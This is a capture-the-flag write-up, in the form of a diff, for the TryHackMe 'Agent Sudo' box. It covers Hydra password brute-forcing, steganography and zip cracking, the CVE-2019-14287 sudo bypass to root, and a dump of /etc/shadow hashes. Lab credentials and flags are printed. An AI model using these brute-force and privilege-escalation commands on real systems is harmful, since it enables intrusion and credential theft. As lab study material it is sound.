@@ -1,0 +1,242 @@
+https://www.youtube.com/watch?v=Ikx6iOocYO0
+
+					Enumeration
+
+$curl "http://10.10.2.196/" -H "User-Agent: A" -L
+
+<!DocType html>
+<html>
+<head>
+	<title>Annoucement</title>
+</head>
+
+<body>
+<p>
+	Dear agents,
+	<br><br>
+	Use your own <b>codename</b> as user-agent to access the site.
+	<br><br>
+	From,<br>
+	Agent R
+</p>
+</body>
+</html>
+
+
+
+
+
+$curl "http://10.10.2.196/" -H "User-Agent: C" -L
+
+Attention chris, <br><br>
+
+Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak! <br><br>
+
+From,<br>
+Agent R 
+
+
+
+(potentail usr:chris)
+					
+					
+					Hydra
+
+
+$hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://10.102.196
+
+$hydra -l chris -P /usr/share/wordlists/rockyou.txt ssh://10.102.196
+
+(ftp creds found)
+
+user:chris
+pass:crystal
+
+
+
+					
+					ftp
+
+$mget *
+
+					
+					
+					steg
+
+$binwalk -e cutie.png
+
+(found zip file)
+
+
+					john
+
+$zip2john 8702.zip > john3.txt
+
+$john john3.txt --wordlist=/usr/share/wordlists/rockyou.txt
+
+(passwd:alien)
+
+$7z e 8702.zip
+
+					base64
+
+$cat To_agentR.txt 
+
+$ echo 'QXJlYTUx' | bae64 -d
+
+Area51
+
+
+
+					steg2
+
+$steghide extract -sf cute-alien.jpg
+(passphrase:Area51)
+
+(found creds)
+
+user:james
+pass:hackerrules!
+
+
+
+					ssh
+$cat user_flag.txt
+
+b03d975e8c92a7c04146cfa7a5a313c7
+
+
+					scp
+
+$sudo scp james@10.10.2.196:/home/james/Alien_autospy.jpg .
+
+
+
+					Google image search
+
+Roswell alien autopsy
+
+
+					SCP2
+
+sudo scp /opt/gitty/LinPEAS/linPEAS/linpeas.sh james@10.10.2.196:/dev/shm
+
+
+
+					Privesc
+
+(CVE-2019-14287)
+
+$sudo -l 
+
+[sudo] password for james: 
+Matching Defaults entries for james on agent-sudo:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User james may run the following commands on agent-sudo:
+    (ALL, !root) /bin/bash
+
+
+
+ (lookup cve sudo)
+ (https://blog.aquasec.com/cve-2019-14287-sudo-linux-vulnerability)
+
+ $sudo -u#-1 /bin/bash
+
+
+ 					Cleanup
+
+$cd /root
+
+$cat root.txt
+
+To Mr.hacker,
+
+Congratulation on rooting this box. This box was designed for TryHackMe. Tips, always update your machine. 
+
+Your flag is 
+b53a02f55b57d4439e3341834d70c062
+
+By,
+DesKel a.k.a Agent R
+
+
+
+
+(agent r is DesKel)
+
+
+					Shi+$ and gigs
+
+$cat /etc/shadow
+
+root:*:18113:0:99999:7:::
+daemon:*:18113:0:99999:7:::
+bin:*:18113:0:99999:7:::
+sys:*:18113:0:99999:7:::
+sync:*:18113:0:99999:7:::
+games:*:18113:0:99999:7:::
+man:*:18113:0:99999:7:::
+lp:*:18113:0:99999:7:::
+mail:*:18113:0:99999:7:::
+news:*:18113:0:99999:7:::
+uucp:*:18113:0:99999:7:::
+proxy:*:18113:0:99999:7:::
+www-data:*:18113:0:99999:7:::
+backup:*:18113:0:99999:7:::
+list:*:18113:0:99999:7:::
+irc:*:18113:0:99999:7:::
+gnats:*:18113:0:99999:7:::
+nobody:*:18113:0:99999:7:::
+systemd-network:*:18113:0:99999:7:::
+systemd-resolve:*:18113:0:99999:7:::
+syslog:*:18113:0:99999:7:::
+messagebus:*:18113:0:99999:7:::
+_apt:*:18113:0:99999:7:::
+lxd:*:18113:0:99999:7:::
+uuidd:*:18113:0:99999:7:::
+dnsmasq:*:18113:0:99999:7:::
+landscape:*:18113:0:99999:7:::
+pollinate:*:18113:0:99999:7:::
+sshd:*:18198:0:99999:7:::
+james:$6$8U2jtYXx$SgRyvDg2.rjtdQlWohWi0cMgzbJdr0..uGIW3AnUHUQM/l/NfwQBc5o7TQU7N.jmR5tAZvdy9mOmvv8Typ6X20:18198:0:99999:7:::
+ftp:*:18198:0:99999:7:::
+chris:$6$uuDBd3ZM$LD65lLDXGtbIZqI0fadKxZsTjYg1n8j4VZi0.9O6rNKsxrFwESDTmgGFcyXOnlmx3JL2aW9yqn1TziC0qAePQ/:18198:0:99999:7:::
+
+
+$cat /etc/passwd
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
+syslog:x:102:106::/home/syslog:/usr/sbin/nologin
+messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
+_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
+lxd:x:105:65534::/var/lib/lxd/:/bin/false
+uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
+dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:109:1::/var/cache/pollinate:/bin/false
+sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
+james:x:1000:1000:james:/home/james:/bin/bash
+ftp:x:111:114:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
+chris:x:1001:1001::/var/FTP:/bin/sh
+
